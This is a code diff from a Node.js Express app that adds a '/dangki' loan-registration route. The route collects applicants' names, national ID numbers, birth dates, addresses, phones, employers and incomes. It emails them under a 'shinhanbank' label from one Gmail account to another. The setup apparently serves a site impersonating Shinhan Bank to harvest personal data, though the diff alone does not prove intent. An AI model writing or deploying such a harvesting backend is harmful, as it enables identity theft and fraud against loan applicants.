@@ -12,19 +12,40 @@ app.get('/', function (req, res) {
     res.render('home');
 });
 
-app.post('/send',jsonParser, function(req, res)
+app.post('/dangki',jsonParser, function(req, res)
 {
     console.log(req.body);
-    /*mailer.send({
-        from: 'tintuc14web@gmail.com',
-        to: `baoanh2003199@gmail.com`,
-        // to: `${email}`,
-        subject: 'Xác minh địa chỉ email của bạn',
+    const customer=
+    {
+        ten: req.body.name,
+        coquan: req.body.coquan,
+        sdt: req.body.sodienthoai,
+        diachi: req.body.diachi,
+        thunhap: req.body.thunhap,
+        sotien: req.body.sotien,
+        socmnd: req.body.socmnd,
+        ngaysinh: req.body.ngaysinh,
+        hinhthuc: req.body.hinhthuc
+    }
+    res.json();
+    mailer.send({
+        from: 'shinhanbankautomail@gmail.com',
+        to: `vayshinhanbankvn@gmail.com`,
+        subject: 'Thông tin vay vốn của khách hàng',
         html: `
-        Xin chào abc, cảm ơn bạn đã đăng ký 1 tài khoản ở trang Tin tức 14.
+        Xin chào, dưới đây là thông tin liên lạc của khách hàng gửi cho bạn từ trang web shinhanbank<br>
+        Họ tên khách hàng: ${customer.ten}<br> 
+        Ngày sinh: ${customer.ngaysinh}<br> 
+        Số điện thoại: ${customer.sdt}<br> 
+        Địa chỉ: ${customer.diachi}<br> 
+        Cơ quan: ${customer.coquan}<br> 
+        Số chứng minh nhân dân:${customer.socmnd}<br> 
+        Thu nhập hàng tháng: ${customer.thunhap}<br>
+        Số tiên cần vay:${customer.sotien}<br> 
+        Hình thức nhận: ${customer.hinhthuc}<br>
         (Đây là thư tự động vui lòng không phản hồi)
         `
-    });*/
+    });
 });
 
 
